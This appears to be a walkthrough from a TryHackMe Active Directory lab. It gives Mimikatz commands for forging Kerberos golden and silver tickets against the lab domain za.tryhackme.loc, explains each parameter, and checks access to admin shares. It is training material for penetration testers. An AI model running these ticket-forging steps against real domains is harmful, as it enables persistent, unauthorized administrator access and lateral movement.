We will now be generating some tickets:

First, open powershell on the attackbox.
Then, Get-ADDomain to enumerate the ad domain for the required
information we will need to exploit the system.

Once we've enumerated, now's the chance to input a command in order to generate our
golden ticket:

kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt

Parameters explained:

/admin - The username we want to impersonate. This does not have to be a valid user.
/domain - The FQDN of the domain we want to generate the ticket for.
/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
/sid -The SID of the domain we want to generate the ticket for.
/krbtgt -The NTLM hash of the KRBTGT account.
/endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
/renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can then verify that the golden ticket is working using the domain 
controller:

dir \\thmdc.za.tryhackme.loc\c$\

These are really good for us, but can be got rid of simply if the blue team
rotate the KRBTGT password twice. So, lets generate some silver tickets:

kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt

Parameters explained:

/admin - The username we want to impersonate. This does not have to be a valid user.
/domain - The FQDN of the domain we want to generate the ticket for.
/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
/sid -The SID of the domain we want to generate the ticket for.
/target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
/rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
/service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.

We can then check if the ticket works by using the following command:
dir \\thmserver1.za.tryhackme.loc\c$\
